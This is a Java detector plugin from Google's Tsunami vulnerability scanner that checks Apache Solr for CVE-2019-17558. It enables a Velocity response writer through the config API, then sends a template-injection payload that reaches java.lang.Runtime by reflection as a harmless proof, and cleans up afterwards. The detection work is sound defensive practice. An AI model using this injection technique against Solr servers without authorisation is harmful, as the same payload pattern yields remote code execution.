/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonElement;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects CVE-2019-17558 in Apache Solr */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "SolrVelocityTemplateRceDetector",
    version = "0.1",
    description =
        "Tsunami detector plugin for Apache Solr Remote Code Execution through the"
            + " VelocityResponseWriter (CVE-2019-17558).",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = SolrVelocityTemplateRceDetectorBootstrapModule.class)
public final class SolrVelocityTemplateRceDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  SolrVelocityTemplateRceDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String writerName = "tsunami-" + utcClock.millis();
    ImmutableList<String> cores = getCores(networkService);
    for (String core : cores) {
      if (createResponseWriter(networkService, core, writerName)) {
        // Ensure that we cleanup the response writer we just created.
        try {
          if (performExploit(networkService, core, writerName)) {
            return true;
          }
        } finally {
          cleanupResponseWriter(networkService, core, writerName);
        }
      }
    }
    return false;
  }

  private ImmutableList<String> getCores(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "solr/admin/cores?wt=json&indexInfo=false&_="
            + utcClock.millis();
    try {
      HttpResponse response =
          httpClient.send(get(targetUri).withEmptyHeaders().build(), networkService);
      try {
        if (response.bodyJson().isEmpty()) {
          return ImmutableList.of();
        }
        JsonElement json = response.bodyJson().get();
        return ImmutableList.copyOf(
            json.getAsJsonObject().get("status").getAsJsonObject().keySet());
      } catch (Throwable t) {
        logger.atInfo().log("Failed to parse cores response json");
        return ImmutableList.of();
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return ImmutableList.of();
    }
  }

  private boolean createResponseWriter(
      NetworkService networkService, String core, String writerName) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "solr/" + core + "/config";
    String payload =
        String.format(
            "{"
                + "\"add-queryresponsewriter\": {"
                + "\"startup\": \"lazy\","
                + "\"name\": \"%s\","
                + "\"class\": \"solr.VelocityResponseWriter\","
                + "\"template.base.dir\": \"\","
                + "\"solr.resource.loader.enabled\": \"true\","
                + "\"params.resource.loader.enabled\": \"true\""
                + "}"
                + "}",
            writerName);
    try {
      HttpResponse response =
          httpClient.send(
              post(targetUri)
                  .withEmptyHeaders()
                  .setRequestBody(ByteString.copyFrom(payload, "UTF8"))
                  .build(),
              networkService);
      return response.status().code() == 200;
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to POST '%s'.", targetUri);
      return false;
    }
  }

  private boolean performExploit(NetworkService networkService, String core, String writerName) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "solr/"
            + core
            + "/select?q=1&&wt="
            + writerName
            + "&v.template=custom&v.template.custom="
            + "%23set($x='TSUNAMI')+"
            + "%23set($str=$x.toLowerCase().substring(4)%2b$x.substring(0,4))+"
            + "%23set($mem=$x.class.forName('java.lang.Runtime').getRuntime().totalMemory())+"
            + "$str+$mem+$str";
    try {
      HttpResponse response =
          httpClient.send(get(targetUri).withEmptyHeaders().build(), networkService);
      if (response.status().code() != 200) {
        return false;
      }
      return response.bodyString().isPresent()
          && response.bodyString().get().matches(".*amiTSUN [0-9]+ amiTSUN.*");
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
  }

  private void cleanupResponseWriter(
      NetworkService networkService, String core, String writerName) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "solr/" + core + "/config";
    String payload = String.format("{\"delete-queryresponsewriter\": \"%s\"}", writerName);
    try {
      HttpResponse response =
          httpClient.send(
              post(targetUri)
                  .withEmptyHeaders()
                  .setRequestBody(ByteString.copyFrom(payload, "UTF8"))
                  .build(),
              networkService);
      if (response.status().code() != 200) {
        logger.atWarning().log("Unable to cleanup response writer");
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to POST '%s'.", targetUri);
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2019_17558"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Apache Solr Velocity Template RCE (CVE-2019-17558)")
                .setDescription(
                    "Apache Solr 5.0.0 to Apache Solr 8.3.1 are vulnerable to a Remote Code"
                        + " Execution through the VelocityResponseWriter. A Velocity template can"
                        + " be provided through Velocity templates in a configset `velocity/`"
                        + " directory or as a parameter. A user defined configset could contain"
                        + " renderable, potentially malicious, templates. Parameter provided"
                        + " templates are disabled by default, but can be enabled by setting"
                        + " `params.resource.loader.enabled` by defining a response writer with"
                        + " that setting set to `true`. Defining a response writer requires"
                        + " configuration API access. Solr 8.4 removed the params resource loader"
                        + " entirely, and only enables the configset-provided template rendering"
                        + " when the configset is `trusted` (has been uploaded by an authenticated"
                        + " user).")
                .setRecommendation("Upgrade to Solr 8.4.0 or greater."))
        .build();
  }
}
